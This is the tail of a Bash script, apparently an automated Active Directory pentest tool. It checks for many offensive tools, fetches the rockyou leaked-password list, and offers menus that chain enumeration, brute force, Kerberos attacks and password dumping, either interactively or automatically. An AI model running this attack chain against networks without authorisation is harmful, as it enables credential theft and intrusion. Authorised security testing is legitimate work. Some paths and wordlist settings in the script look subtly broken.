        if ! stat "${silenthound}" >/dev/null 2>&1; then echo -e "${RED}[-] silenthound is not installed${NC}"; else echo -e "${GREEN}[+] silenthound is installed${NC}"; fi
        if ! stat "${donpapi}" >/dev/null 2>&1; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
        if ! stat "${hekatomb}" >/dev/null 2>&1; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
        if ! stat "${FindUncommonShares}" >/dev/null 2>&1; then echo -e "${RED}[-] FindUncommonShares is not installed${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is installed${NC}"; fi
        if ! stat "${FindUnusualSessions}" >/dev/null 2>&1; then echo -e "${RED}[-] FindUnusualSessions is not installed${NC}"; else echo -e "${GREEN}[+] FindUnusualSessions is installed${NC}"; fi
        if ! stat "${ExtractBitlockerKeys}" >/dev/null 2>&1; then echo -e "${RED}[-] ExtractBitlockerKeys is not installed${NC}"; else echo -e "${GREEN}[+] ExtractBitlockerKeys is installed${NC}"; fi
        if ! stat "${ldapconsole}" >/dev/null 2>&1; then echo -e "${RED}[-] ldapconsole is not installed${NC}"; else echo -e "${GREEN}[+] ldapconsole is installed${NC}"; fi
        if ! stat "${pyLDAPmonitor}" >/dev/null 2>&1; then echo -e "${RED}[-] pyLDAPmonitor is not installed${NC}"; else echo -e "${GREEN}[+] pyLDAPmonitor is installed${NC}"; fi
        if ! stat "${LDAPWordlistHarvester}" >/dev/null 2>&1; then echo -e "${RED}[-] LDAPWordlistHarvester is not installed${NC}"; else echo -e "${GREEN}[+] LDAPWordlistHarvester is installed${NC}"; fi
        if ! stat "${rdwatool}" >/dev/null 2>&1; then echo -e "${RED}[-] rdwatool is not installed${NC}"; else echo -e "${GREEN}[+] rdwatool is installed${NC}"; fi
        if ! stat "${manspider}" >/dev/null 2>&1; then echo -e "${RED}[-] manspider is not installed${NC}"; else echo -e "${GREEN}[+] manspider is installed${NC}"; fi
        if ! stat "${coercer}" >/dev/null 2>&1; then echo -e "${RED}[-] coercer is not installed${NC}"; else echo -e "${GREEN}[+] coercer is installed${NC}"; fi
        if ! stat "${bloodyad}" >/dev/null 2>&1; then echo -e "${RED}[-] bloodyad is not installed${NC}"; else echo -e "${GREEN}[+] bloodyad is installed${NC}"; fi
        if ! stat "${aced}" >/dev/null 2>&1; then echo -e "${RED}[-] aced is not installed${NC}"; else echo -e "${GREEN}[+] aced is installed${NC}"; fi
        if ! stat "${sccmhunter}" >/dev/null 2>&1; then echo -e "${RED}[-] sccmhunter is not installed${NC}"; else echo -e "${GREEN}[+] sccmhunter is installed${NC}"; fi
        if ! stat "${krbjack}" >/dev/null 2>&1; then echo -e "${RED}[-] krbjack is not installed${NC}"; else echo -e "${GREEN}[+] krbjack is installed${NC}"; fi
        if ! stat "${ldapper}" >/dev/null 2>&1; then echo -e "${RED}[-] ldapper is not installed${NC}"; else echo -e "${GREEN}[+] ldapper is installed${NC}"; fi
        if ! stat "${orpheus}" >/dev/null 2>&1; then echo -e "${RED}[-] orpheus is not installed${NC}"; else echo -e "${GREEN}[+] orpheus is installed${NC}"; fi
        if ! stat "${adalanche}" >/dev/null 2>&1; then echo -e "${RED}[-] adalanche is not installed${NC}"; else echo -e "${GREEN}[+] adalanche is installed${NC}"; fi
        if ! stat "${mssqlrelay}" >/dev/null 2>&1; then echo -e "${RED}[-] mssqlrelay is not installed${NC}"; else echo -e "${GREEN}[+] mssqlrelay is installed${NC}"; fi
        if ! stat "${pygpoabuse}" >/dev/null 2>&1; then echo -e "${RED}[-] pygpoabuse is not installed${NC}"; else echo -e "${GREEN}[+] pygpoabuse is installed${NC}"; fi
        if ! stat "${GPOwned}" >/dev/null 2>&1; then echo -e "${RED}[-] GPOwned is not installed${NC}"; else echo -e "${GREEN}[+] GPOwned is installed${NC}"; fi
        if ! stat "${privexchange}" >/dev/null 2>&1; then echo -e "${RED}[-] privexchange is not installed${NC}"; else echo -e "${GREEN}[+] privexchange is installed${NC}"; fi
        if ! stat "${RunFinger}" >/dev/null 2>&1; then echo -e "${RED}[-] RunFinger is not installed${NC}"; else echo -e "${GREEN}[+] RunFinger is installed${NC}"; fi
        if ! stat "${LDAPNightmare}" >/dev/null 2>&1; then echo -e "${RED}[-] LDAPNightmare is not installed${NC}"; else echo -e "${GREEN}[+] LDAPNightmare is installed${NC}"; fi
        if ! stat "${ADCheck}" >/dev/null 2>&1; then echo -e "${RED}[-] ADCheck is not installed${NC}"; else echo -e "${GREEN}[+] ADCheck is installed${NC}"; fi
        if ! stat "${smbclientng}" >/dev/null 2>&1; then echo -e "${RED}[-] smbclientng is not installed${NC}"; else echo -e "${GREEN}[+] smbclientng is installed${NC}"; fi
        if ! stat "${ldapnomnom}" >/dev/null 2>&1; then echo -e "${RED}[-] ldapnomnom is not installed${NC}"; else echo -e "${GREEN}[+] ldapnomnom is installed${NC}"; fi
        if ! stat "${godap}" >/dev/null 2>&1; then echo -e "${RED}[-] godap is not installed${NC}"; else echo -e "${GREEN}[+] godap is installed${NC}"; fi
        if ! stat "${mssqlpwner}" >/dev/null 2>&1; then echo -e "${RED}[-] mssqlpwner is not installed${NC}"; else echo -e "${GREEN}[+] mssqlpwner is installed${NC}"; fi
        if ! stat "${soapy}" >/dev/null 2>&1; then echo -e "${RED}[-] soapy is not installed${NC}"; else echo -e "${GREEN}[+] soapy is installed${NC}"; fi
        if ! stat "${sccmsecrets}" >/dev/null 2>&1; then echo -e "${RED}[-] sccmsecrets is not installed${NC}"; else echo -e "${GREEN}[+] sccmsecrets is installed${NC}"; fi
        if ! stat "${soaphound}" >/dev/null 2>&1; then echo -e "${RED}[-] Soaphound is not installed${NC}"; else echo -e "${GREEN}[+] Soaphound is installed${NC}"; fi
        if ! stat "${gpoParser}" >/dev/null 2>&1; then echo -e "${RED}[-] gpoParser is not installed${NC}"; else echo -e "${GREEN}[+] gpoParser is installed${NC}"; fi
        if ! stat "${spearspray}" >/dev/null 2>&1; then echo -e "${RED}[-] Spearspray is not installed${NC}"; else echo -e "${GREEN}[+] Spearspray is installed${NC}"; fi
        if ! stat "${GroupPolicyBackdoor}" >/dev/null 2>&1; then echo -e "${RED}[-] GroupPolicyBackdoor is not installed${NC}"; else echo -e "${GREEN}[+] GroupPolicyBackdoor is installed${NC}"; fi
        if ! stat "${NetworkHound}" >/dev/null 2>&1; then echo -e "${RED}[-] NetworkHound is not installed${NC}"; else echo -e "${GREEN}[+] NetworkHound is installed${NC}"; fi
        if ! stat "${sharehound}" >/dev/null 2>&1; then echo -e "${RED}[-] ShareHound is not installed${NC}"; else echo -e "${GREEN}[+] ShareHound is installed${NC}"; fi
        if ! stat "${daclsearch}" >/dev/null 2>&1; then echo -e "${RED}[-] DACLSearch is not installed${NC}"; else echo -e "${GREEN}[+] DACLSearch is installed${NC}"; fi
        config_menu
        ;;

    2)
        ntp_update
        config_menu
        ;;

    3)
        etc_hosts_update
        config_menu
        ;;

    4)
        etc_resolv_update
        config_menu
        ;;

    5)
        etc_krb5conf_update
        config_menu
        ;;

    6)
        echo -e ""
        sudo mkdir -p "${wordlists_dir} "
        sudo chown -R "$(whoami)" "${wordlists_dir}"
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -O "${wordlists_dir}/rockyou.txt.tar.gz"
        gunzip "${wordlists_dir}/rockyou.txt.tar.gz"
        tar xf "${wordlists_dir}/rockyou.txt.tar" -C "${wordlists_dir}/"
        chmod 644 "${wordlists_dir}/rockyou.txt"
        /bin/rm "${wordlists_dir}/rockyou.txt.tar"
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt" -O "${wordlists_dir}/cirt-default-usernames.txt"
        pass_wordlist="${wordlists_dir}/rockyou.txt"
        user_wordlist="${wordlists_dir}/xato-net-10-million-usernames.txt"
        echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
        config_menu
        ;;

    7)
        echo -e "${BLUE}[*] Please specify new users wordlist file:${NC}"
        read -rp ">> " user_wordlist </dev/tty
        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
        config_menu
        ;;

    8)
        echo -e "${BLUE}[*] Please specify new passwords wordlist file:${NC}"
        read -rp ">> " pass_wordlist </dev/tty
        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
        config_menu
        ;;

    9)
        echo ""
        set_attackerIP
        config_menu
        ;;

    10)
        echo ""
        if [ "${ldaps_bool}" == false ]; then
            ldaps_bool=true
            echo -e "${GREEN}[+] Switched to using LDAPS on port 636${NC}"

        else
            ldaps_bool=false
            echo -e "${GREEN}[+] Switched to using LDAP on port 389${NC}"
        fi
        config_menu
        ;;

    11)
        echo ""
        print_info
        config_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        config_menu
        ;;
    esac
}

main_menu() {
    parse_users
    parse_servers
    echo -e ""
    echo -e "${PURPLE}[Main menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "A) Authentication Menu"
    echo -e "C) Configuration Menu"
    echo -e "1) Run DNS Enumeration using netexec"
    echo -e "2) Active Directory Enumeration Menu"
    echo -e "3) ADCS Enumeration Menu"
    echo -e "4) SCCM Enumeration Menu"
    echo -e "5) GPO Enumeration Menu"
    echo -e "6) Brute Force Attacks Menu"
    echo -e "7) Kerberos Attacks Menu"
    echo -e "8) SMB shares Enumeration Menu"
    echo -e "9) Vulnerability Checks Menu"
    echo -e "10) MSSQL Enumeration Menu"
    echo -e "11) Password Dump Menu"
    echo -e "12) AD Objects or Attributes Modification Menu"
    echo -e "13) Command Execution Menu"
    echo -e "14) Network Scan Menu"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    C)
        config_menu
        ;;

    A)
        auth_menu
        ;;

    1)
        /bin/rm "${DomainRecon_dir}/dns_records_${dc_domain}.csv" 2>/dev/null
        dns_enum
        main_menu
        ;;

    2)
        ad_menu
        ;;

    3)
        adcs_menu
        ;;

    4)
        sccm_menu
        ;;

    5)
        gpo_menu
        ;;

    6)
        bruteforce_menu
        ;;

    7)
        kerberos_menu
        ;;

    8)
        shares_menu
        ;;

    9)
        vulns_menu
        ;;

    10)
        mssql_menu
        ;;

    11)
        pwd_menu
        ;;

    12)
        modif_menu
        ;;

    13)
        cmdexec_menu
        ;;

    14)
        netscan_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        main_menu
        ;;
    esac
}

main() {
    print_banner
    prepare
    print_info
    if [ "${interactive_bool}" == true ]; then
        authenticate
        main_menu
    else
        authenticate
        parse_users
        parse_servers
        dns_enum
        echo -e "${GREEN}[+] Start: Active Directory Enumeration${NC}"
        echo -e "${GREEN}---------------------------------------${NC}"
        echo -e ""
        ad_enum
        echo -e "${GREEN}[+] Start: ADCS Enumeration${NC}"
        echo -e "${GREEN}---------------------------${NC}"
        echo -e ""
        adcs_enum
        echo -e "${GREEN}[+] Start: SCCM Enumeration${NC}"
        echo -e "${GREEN}---------------------------${NC}"
        echo -e ""
        sccm_enum
        echo -e "${GREEN}[+] Start: GPO Enumeration${NC}"
        echo -e "${GREEN}---------------------------${NC}"
        echo -e ""
        gpo_enum
        echo -e "${GREEN}[+] Start: User and password Brute force Attacks${NC}"
        echo -e "${GREEN}------------------------------------------------${NC}"
        echo -e ""
        bruteforce
        echo -e "${GREEN}[+] Start: Kerberos-based Attacks${NC}"
        echo -e "${GREEN}----------------------------------${NC}"
        echo -e ""
        kerberos
        echo -e "${GREEN}[+] Start: Network Scans${NC}"
        echo -e "${GREEN}------------------------${NC}"
        echo -e ""
        netscan_run
        echo -e "${GREEN}[+] Start: Network Shares Scan${NC}"
        echo -e "${GREEN}------------------------------${NC}"
        echo -e ""
        scan_shares
        echo -e "${GREEN}[+] Start: Vulnerability Checks${NC}"
        echo -e "${GREEN}-------------------------------${NC}"
        echo -e ""
        vuln_checks
        echo -e "${GREEN}[+] Start: MSSQL Enumeration${NC}"
        echo -e "${GREEN}----------------------------${NC}"
        echo -e ""
        mssql_checks
        echo -e ""
        echo -e "${GREEN}[+] Automatic enumeration has completed. Output folder is: ${output_dir}${NC}"
        echo -e "${GREEN}---------------------------------------------------------${NC}"

    fi
}

main
